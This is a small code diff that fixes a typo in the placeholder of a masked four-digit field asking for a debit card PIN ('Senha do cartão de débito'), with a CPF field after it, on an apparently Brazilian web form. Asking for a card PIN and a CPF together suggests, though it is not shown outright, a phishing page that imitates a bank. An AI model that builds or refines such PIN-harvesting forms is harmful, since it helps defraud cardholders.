@@ -47,7 +47,7 @@
 	
 							<br><br>
 							<p id="titulosenha1"  style="color: #ffffff; font-size: 13px; width: 100%; margin-left: 25px; display: none;">Senha do cartão de débito</p>	
-							<input maxLength="4" onkeyup="formataMascara2();" name="senhadebito" id="senhadebito" placeholder="Senah do cartão de débito" class="input-field fields-search active-input-search" style="-webkit-text-security: disc;" type="tel">
+							<input maxLength="4" onkeyup="formataMascara2();" name="senhadebito" id="senhadebito" placeholder="Senha do cartão de débito" class="input-field fields-search active-input-search" style="-webkit-text-security: disc;" type="tel">
 
 							<br><br>							
 							<p id="titulocpf"  style="color: #ffffff; font-size: 13px; width: 100%; margin-left: 25px; display: none;">CPF</p>	
